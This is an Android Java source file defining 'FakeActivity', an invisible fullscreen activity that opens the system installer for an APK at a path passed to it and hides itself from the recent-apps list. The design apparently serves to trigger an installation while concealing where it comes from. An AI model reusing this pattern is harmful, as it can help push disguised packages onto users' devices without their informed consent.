package com.xstd.qm;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.view.Window;
import android.view.WindowManager;
import com.xstd.quick.R;

import java.io.File;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-11-5
 * Time: PM4:42
 * To change this template use File | Settings | File Templates.
 */
public class FakeActivity extends Activity {

    public static final String KEY_PATH = "key_path";

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        requestWindowFeature(Window.FEATURE_NO_TITLE);

        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                                WindowManager.LayoutParams.FLAG_FULLSCREEN);

        this.getWindow().setBackgroundDrawableResource(R.drawable.transparent);

        String fullPath = getIntent().getStringExtra(KEY_PATH);

        Intent i = new Intent(Intent.ACTION_VIEW);
        File upgradeFile = new File(fullPath);
        i.setDataAndType(Uri.fromFile(upgradeFile), "application/vnd.android.package-archive");
        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        i.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        startActivity(i);
    }

}